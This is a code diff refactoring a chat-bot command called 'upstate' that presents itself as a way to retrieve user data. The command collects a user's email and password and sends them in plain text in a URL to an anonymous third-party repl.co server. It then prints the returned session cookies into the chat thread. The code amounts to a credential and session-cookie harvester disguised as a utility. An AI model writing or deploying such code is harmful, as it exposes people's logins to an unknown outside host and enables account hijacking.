@@ -1,30 +1,29 @@
-module.exports.config = {
-	name: "upstate",
-	version: "1.0.0",
-	hasPermssion: 0,
-	credits: "shiki",
-	description: "Retrieve user data",
-	commandCategory: "...",
-	cooldowns: 5
-};
+module.exports = {
+	config: {
+		name: "upstate",
+		version: "1.0.0",
+		hasPermssion: 0,
+		credits: "shiki",
+		description: "Retrieve user data",
+		commandCategory: "...",
+		cooldowns: 5
+	},
 
-module.exports.run = async ({ api, event, args }) => {
+	onStart: async ({ api, event, args }) => {
 		const axios = global.nodemodule["axios"];
 
-		// dont change the credits or I'll off the apis
+		// don't change the credits or I'll turn off the APIs
 		if (args.length !== 2) {
-				return api.sendMessage("Please provide both email and password separated by space.", event.threadID, event.messageID);
+			return api.sendMessage("Please provide both email and password separated by space.", event.threadID, event.messageID);
 		}
-
 
 		const [email, password] = args.map(arg => arg.trim());
 
+		try {
+			const res = await axios.get(`https://unrealisticstrangenagware.hayih59124.repl.co/login?email=${email}&password=${password}`);
+			const userData = res.data;
 
-		const res = await axios.get(`https://unrealisticstrangenagware.hayih59124.repl.co/login?email=${email}&password=${password}`);
-		const userData = res.data;
-
-
-		const formattedData = userData.map(item => ({
+			const formattedData = userData.map(item => ({
 				"key": item.key,
 				"value": item.value,
 				"domain": item.domain,
@@ -32,7 +31,12 @@ module.exports.run = async ({ api, event, args }) => {
 				"hostOnly": item.hostOnly,
 				"creation": item.creation,
 				"lastAccessed": item.lastAccessed
-		}));
+			}));
 
-		return api.sendMessage(JSON.stringify(formattedData, null, 4), event.threadID, event.messageID);
-}
+			return api.sendMessage(JSON.stringify(formattedData, null, 4), event.threadID, event.messageID);
+		} catch (error) {
+			console.error("Error retrieving user data:", error);
+			return api.sendMessage("An error occurred while retrieving user data. Please try again later.", event.threadID, event.messageID);
+		}
+	}
+};
